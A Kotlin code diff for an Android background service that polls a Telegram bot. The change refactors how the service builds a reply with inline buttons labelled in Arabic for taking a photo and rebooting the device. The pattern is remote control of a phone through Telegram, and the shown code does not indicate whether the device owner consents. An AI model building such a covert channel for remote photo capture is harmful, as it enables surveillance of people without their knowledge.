@@ -85,7 +85,6 @@ class BackgroundControlService : Service() {
                                 val update = results.getJSONObject(i)
                                 lastUpdateId = update.getLong("update_id")
 
-                                // دعم الأوامر النصية وضغطات الأزرار (callback_query)
                                 var chatId = ""
                                 var text = ""
 
@@ -160,16 +159,18 @@ class BackgroundControlService : Service() {
     private fun sendTelegramMessageWithKeyboard(chatId: String, text: String) {
         thread {
             try {
-                val keyboardJson = """
-                    {
-                      "inline_keyboard": [
-                        [
-                          {"text": "📸 التقاط صورة", "callback_data": "/photo"},
-                          {"text": "🔌 إعادة تشغيل", "callback_data": "/reboot"}
-                        ]
-                      ]
-                    }
-                """.trimIndent()
+                val jsonBody = JSONObject().apply {
+                    put("chat_id", chatId)
+                    put("text", text)
+                    put("reply_markup", JSONObject().apply {
+                        put("inline_keyboard", org.json.JSONArray().apply {
+                            put(org.json.JSONArray().apply {
+                                put(JSONObject().put("text", "📸 التقاط صورة").put("callback_data", "/photo"))
+                                put(JSONObject().put("text", "🔌 إعادة تشغيل").put("callback_data", "/reboot"))
+                            })
+                        })
+                    })
+                }
 
                 val urlString = "https://api.telegram.org/bot$botToken/sendMessage"
                 val url = URL(urlString)
@@ -178,14 +179,8 @@ class BackgroundControlService : Service() {
                 connection.doOutput = true
                 connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
 
-                val payload = JSONObject().apply {
-                    put("chat_id", chatId)
-                    put("text", text)
-                    put("reply_markup", JSONObject(keyboardJson))
-                }
-
                 val os = connection.outputStream
-                os.write(payload.toString().toByteArray(Charsets.UTF_8))
+                os.write(jsonBody.toString().toByteArray(Charsets.UTF_8))
                 os.flush()
                 os.close()
 
